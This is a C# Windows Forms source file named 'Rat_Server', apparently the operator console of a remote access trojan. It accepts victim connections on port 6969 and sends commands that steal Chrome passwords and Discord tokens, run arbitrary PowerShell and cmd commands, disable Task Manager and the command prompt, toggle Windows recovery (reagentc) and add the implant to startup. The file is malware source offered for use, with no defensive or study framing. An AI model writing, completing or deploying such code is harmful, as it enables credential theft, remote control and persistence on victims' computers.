using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Rat_Server
{
    public partial class Form1 : Form
    {
        private TcpListener listener;
        private readonly object clientLock = new object();
        private readonly List<TcpClient> connectedClients = new List<TcpClient>();
        private int clientCounter = 0;
        private readonly Dictionary<string, TcpClient> clientDictionary = new Dictionary<string, TcpClient>();

        public Form1()
        {
            InitializeComponent();
            StartServer();
        }

        private void StartServer()
        {
            Task.Run(async () =>
            {
                listener = new TcpListener(IPAddress.Any, 6969);
                listener.Start();
                MessageBox.Show("Server started on port 6969...");

                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    lock (clientLock)
                    {
                        clientCounter++;
                        string clientId = $"Client {clientCounter}";
                        clientDictionary[clientId] = client;
                        AddClientToComboBox(clientId);
                    }

                    MessageBox.Show($"Client connected: {client.Client.RemoteEndPoint}");
                    _ = HandleClientAsync(client);
                }
            });
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            NetworkStream stream = client.GetStream();

            try
            {
                while (client.Connected)
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        MessageBox.Show($"Received: {message}");
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error with client {client.Client.RemoteEndPoint}: {ex.Message}");
            }
            finally
            {
                string disconnectedClientId = null;

                lock (clientLock)
                {
                    foreach (var kvp in clientDictionary)
                    {
                        if (kvp.Value == client)
                        {
                            disconnectedClientId = kvp.Key;
                            break;
                        }
                    }

                    if (disconnectedClientId != null)
                    {
                        clientDictionary.Remove(disconnectedClientId);
                        RemoveClientFromComboBox(disconnectedClientId);
                    }
                }

                client.Close();
                MessageBox.Show($"Client disconnected: {client.Client.RemoteEndPoint}");
            }
        }

        private void OpenCommandInputDialog(string commandType)
        {
            using (var inputForm = new Form())
            {
                inputForm.Text = $"Enter {commandType} Command";
                inputForm.Size = new System.Drawing.Size(300, 150);

                Label lblCommand = new Label() { Left = 10, Top = 20, Text = $"Enter {commandType} Command:" };
                TextBox txtCommand = new TextBox() { Left = 10, Top = 50, Width = 250 };
                Button btnSubmit = new Button() { Left = 190, Top = 80, Text = "Submit" };

                btnSubmit.Click += (sender, e) =>
                {
                    string command = txtCommand.Text;
                    if (!string.IsNullOrEmpty(command))
                    {
                        // Check if a client is selected and there are clients in the list
                        if (comboBoxClients.SelectedIndex != -1 && comboBoxClients.Items.Count > 0)
                        {
                            // Get the selected client based on the combo box selection
                            var selectedClient = connectedClients[comboBoxClients.SelectedIndex];
                            // Send the command to the selected client
                            SendCommand(selectedClient, $"{commandType}command|{command}");
                            MessageBox.Show($"Command sent to {comboBoxClients.SelectedItem}: {command}");
                        }
                        else
                        {
                            MessageBox.Show("Please select a client from the dropdown.");
                        }
                    }
                    inputForm.Close();
                };

                inputForm.Controls.Add(lblCommand);
                inputForm.Controls.Add(txtCommand);
                inputForm.Controls.Add(btnSubmit);
                inputForm.ShowDialog();
            }
        }

        private void SendCommand(TcpClient client, string command)
        {
            NetworkStream stream = client.GetStream();
            byte[] data = Encoding.ASCII.GetBytes(command + "|");
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }

        private void chromePasswords_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("chrome_info");
        }

        private void PowershellCommand_Click(object sender, EventArgs e)
        {
            OpenCommandInputDialog("ps");
        }

        private void CmdCommand_Click(object sender, EventArgs e)
        {
            OpenCommandInputDialog("cmd");
        }

        private void ReagentcEnable_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("enable_reagentc");
        }

        private void ReagentcDisable_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("disable_reagentc");
        }

        private void EnableCmd_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("enable_cmd|");
        }

        private void DisableCmd_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("disable_cmd|");
        }

        private void EnableTaskManager_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("enable_taskmanager|");
        }

        private void DisableTaskManager_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("disable_taskmanager|");
        }

        private void AddToStartup_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("add_to_startup|");
        }

        private void RemoveFromStartup_Click(object sender, EventArgs e)
        { 
            SendCommandToSelectedClient("remove_from_startup|");
        }

        private void GetDiscordTokens_Click(object sender, EventArgs e)
        {
            
            SendCommandToSelectedClient("get_discord_tokens|");
        }

        private void SendCommandToSelectedClient(string command)
        {
            TcpClient client = GetSelectedClient();
            if (client != null)
            {
                SendCommand(client, command);
                MessageBox.Show($"Command sent to {client.Client.RemoteEndPoint}: {command}");
            }
        }

        private TcpClient GetSelectedClient()
        {
            string selectedClient = comboBoxClients.SelectedItem?.ToString();
            if (string.IsNullOrEmpty(selectedClient))
            {
                MessageBox.Show("Please select a client first!");
                return null;
            }

            lock (clientLock)
            {
                if (clientDictionary.TryGetValue(selectedClient, out var client))
                {
                    return client;
                }
                else
                {
                    MessageBox.Show("Selected client is no longer connected.");
                    return null;
                }
            }
        }

        private void AddClientToComboBox(string clientId)
        {
            Invoke(new Action(() =>
            {
                comboBoxClients.Items.Add(clientId);
            }));
        }

        private void RemoveClientFromComboBox(string clientId)
        {
            Invoke(new Action(() =>
            {
                comboBoxClients.Items.Remove(clientId);
            }));
        }

    }
}
